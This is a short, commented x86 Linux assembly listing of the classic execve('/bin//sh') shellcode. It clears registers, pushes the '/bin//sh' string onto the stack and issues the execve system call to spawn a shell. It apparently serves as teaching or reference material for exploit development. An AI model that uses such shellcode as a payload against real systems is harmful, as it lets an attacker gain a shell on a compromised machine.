section .text
global _start
_start:
xor		ecx, ecx	; set ecx to 0 (argv == NULL)
xor		edx, edx	; set edx to 0 (envp == NULL)
push	ecx			; push 0 to the stack to end the command string
push	0x68732f2f	; "//sh" end of the command string
push	0x6e69622f	; "/bin" start of the command string
mov		ebx, esp	; set ebx to the start of the command string
push	0xb			; push 11 (execve int number)
pop		eax			; set eax to 11
int		0x80		; execve("/bin//sh", NULL, NULL)
